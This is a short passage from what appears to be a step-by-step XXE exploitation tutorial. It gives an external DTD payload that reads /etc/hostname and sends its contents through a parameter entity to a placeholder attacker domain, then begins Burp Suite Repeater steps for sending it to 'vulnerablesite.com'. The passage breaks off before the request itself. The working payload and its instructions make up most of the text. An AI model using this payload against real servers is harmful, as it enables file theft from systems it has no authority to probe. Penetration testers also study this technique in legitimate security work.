```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % exfil '<!ENTITY &#x25; pitr SYSTEM "http://<YOUR_DOMAIN>/%file;">'>
```

1. Open up Burp Suite Repeater and create a new request.
2. Set the target to `vulnerablesite.com` and the corresponding port. Enter the following HTTP request and click "Send"
